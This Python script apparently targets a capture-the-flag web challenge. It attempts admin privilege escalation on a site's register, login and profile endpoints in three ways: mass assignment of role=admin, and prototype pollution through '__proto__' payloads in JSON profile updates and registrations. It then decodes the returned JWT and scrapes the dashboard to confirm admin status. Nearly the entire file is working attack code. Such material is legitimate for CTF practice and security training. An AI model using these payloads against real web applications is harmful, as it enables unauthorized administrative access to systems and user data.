import requests
import json
import base64
import random
import string
import re

BASE_URL = "https://qwertyuioplk-csc26.cybersecuritychallenge.al"

# Create a session to maintain cookies
session = requests.Session()
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
})

rand_id = ''.join(random.choices(string.digits, k=6))
email = f"admin{rand_id}@test.com"
username = f"admin{rand_id}"
password = "Test123456!"

print("="*60)
print("[*] ATTACK 1: Register with role=admin (Mass Assignment)")
print("="*60)

# Try registering with role=admin  
reg_data = {"username": username, "email": email, "password": password, "role": "admin"}
r = session.post(f"{BASE_URL}/register", data=reg_data, allow_redirects=False)
print(f"    Register with role=admin: {r.status_code}")

# Login
login_data = {"email": email, "password": password}
r = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False)
print(f"    Login: {r.status_code}")

# Check JWT
auth_token = session.cookies.get('auth_token', '')
if auth_token:
    parts = auth_token.split('.')
    if len(parts) == 3:
        payload_part = parts[1] + '=' * (4 - len(parts[1]) % 4)
        decoded = json.loads(base64.b64decode(payload_part))
        print(f"    JWT role: {decoded.get('role', 'N/A')}")
        if decoded.get('role') == 'admin':
            print("[!] SUCCESS! Registered as admin!")
            
# Check dashboard
r = session.get(f"{BASE_URL}/dashboard")
if "role: admin" in r.text.lower() or "role:</strong> admin" in r.text.lower():
    print(f"[!] GOT ADMIN!\n{r.text}")
else:
    role_match = re.search(r'role.*?<strong>(\w+)</strong>', r.text, re.I)
    if role_match:
        print(f"    Dashboard role: {role_match.group(1)}")

print("\n" + "="*60)
print("[*] ATTACK 2: Prototype Pollution via JSON __proto__")
print("="*60)

# Fresh session
session2 = requests.Session()
session2.headers.update({"User-Agent": "Mozilla/5.0"})

rand_id2 = ''.join(random.choices(string.digits, k=6))
email2 = f"proto{rand_id2}@test.com"

# Register fresh
reg_data2 = {"username": f"proto{rand_id2}", "email": email2, "password": password}
session2.post(f"{BASE_URL}/register", data=reg_data2, allow_redirects=False)
session2.post(f"{BASE_URL}/login", data={"email": email2, "password": password}, allow_redirects=False)

print(f"    Logged in as proto{rand_id2}")

# Try prototype pollution
pollution_payload = {"bio": "hacked", "__proto__": {"role": "admin"}}
r = session2.post(f"{BASE_URL}/updateProfile", json=pollution_payload, 
                  headers={"Content-Type": "application/json"}, allow_redirects=True)
print(f"    Pollution request: {r.status_code}")

# Check if it worked - sometimes need to re-login for new JWT
session2.post(f"{BASE_URL}/login", data={"email": email2, "password": password}, allow_redirects=False)

auth_token2 = session2.cookies.get('auth_token', '')
if auth_token2:
    parts = auth_token2.split('.')
    payload_part = parts[1] + '=' * (4 - len(parts[1]) % 4)
    decoded = json.loads(base64.b64decode(payload_part))
    print(f"    JWT after pollution: {decoded}")

r = session2.get(f"{BASE_URL}/dashboard")
role_match = re.search(r'role.*?<strong>(\w+)</strong>', r.text, re.I)
if role_match:
    print(f"    Dashboard role: {role_match.group(1)}")
    if role_match.group(1).lower() == "admin":
        print("[!] SUCCESS! Prototype pollution worked!")
        print(r.text)

print("\n" + "="*60)
print("[*] ATTACK 3: JSON Register with __proto__")  
print("="*60)

session3 = requests.Session()
rand_id3 = ''.join(random.choices(string.digits, k=6))

# Try registering with prototype pollution in JSON
reg_json = {
    "username": f"proto2_{rand_id3}",
    "email": f"proto2_{rand_id3}@test.com", 
    "password": password,
    "__proto__": {"role": "admin"}
}
r = session3.post(f"{BASE_URL}/register", json=reg_json, 
                  headers={"Content-Type": "application/json"}, allow_redirects=False)
print(f"    JSON register with __proto__: {r.status_code}")
print(f"    Response: {r.text[:200] if r.text else 'Empty'}")

# Login
r = session3.post(f"{BASE_URL}/login", json={"email": f"proto2_{rand_id3}@test.com", "password": password},
                  headers={"Content-Type": "application/json"}, allow_redirects=False)
print(f"    Login: {r.status_code}")
print(f"    Set-Cookie: {r.headers.get('Set-Cookie', 'None')[:100] if r.headers.get('Set-Cookie') else 'None'}")

print("\n[*] Done!")

print("\n[*] Done!")
